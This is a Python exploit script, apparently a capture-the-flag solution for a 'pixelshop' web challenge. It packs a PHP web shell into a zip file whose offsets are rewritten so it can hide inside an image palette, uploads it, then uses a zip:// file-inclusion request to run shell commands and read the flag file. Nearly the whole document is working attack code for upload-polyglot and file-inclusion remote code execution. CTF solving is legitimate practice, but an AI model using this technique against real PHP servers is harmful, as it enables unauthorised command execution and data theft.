def make_embedded(zipdata, prefixlen, suffixlen):
    ''' Embed a zip file in zipdata in a larger file by modifying the offset to the central directory
    and the comment length. '''
    import struct

    zipdata = bytearray(zipdata)

    eocd_off = zipdata.rfind(b'PK\x05\x06')
    if eocd_off == -1:
        raise ValueError("Can't find end of central directory.")

    ncd, ncd_total, cd_sz, cd_off, comment_len = struct.unpack('<HHIIH', zipdata[eocd_off+8:eocd_off+22])
    # rewrite offset to central directory, size of comment
    zipdata[eocd_off+16:eocd_off+22] = struct.pack('<IH', cd_off + prefixlen, comment_len + suffixlen)

    # rewrite local offsets
    pos = cd_off
    for i in xrange(ncd):
        loff, = struct.unpack('<I', zipdata[pos+42:pos+46])
        zipdata[pos+42:pos+46] = struct.pack('<I', loff + prefixlen)
        n, m, k = struct.unpack('<HHH', zipdata[pos+28:pos+34])
        pos += 46 + n + m + k

    return bytes(zipdata)

shell = open('shell.php', 'r').read()

def create_exploit_palette():
    from cStringIO import StringIO
    from zipfile import ZipFile

    s = StringIO()
    z = ZipFile(s, 'w')
    z.writestr("shell.php", shell)
    z.close()

    zipdata = s.getvalue()
    prefix = 41
    suffix = 40
    padding = 3 - len(zipdata) % 3
    suffix += padding

    palette = make_embedded(zipdata, prefix, suffix) + '\xff' * padding
    assert len(palette) < 765
    return ['#%02x%02x%02x' % tuple(map(ord, palette[i:i+3])) for i in xrange(0, len(palette), 3)]

def create_exploit_palette():
    data = shell
    padding = 3 - len(data) % 3

    palette = data + '\xff' * padding
    assert len(palette) < 765
    return ['#%02x%02x%02x' % tuple(map(ord, palette[i:i+3])) for i in xrange(0, len(palette), 3)]

import requests, json

URL = 'http://localhost/pixelshop/'#pixelshop.pwning.xxx'
s = requests.Session()
r = s.post(URL + '?op=new', data={'submit': '1', 'width': 32, 'height': 32})
imagekey = r.url[-40:]
data = {'im': [0] * 1024, 'pal': create_exploit_palette()}
r = s.post(URL + '?op=save', data={'imagekey': imagekey, 'savedata': json.dumps(data)})

def execute_cmd(cmd):
    r = s.get(URL, params={'op': 'zip://uploads/%s.png#shell' % imagekey, 'e': cmd})
    return r.text

print execute_cmd('cat /FLAG_KEY_PCTF_FLAG_GOES_HERE_OPEN_ME_GUYS_SERIOUSLY')
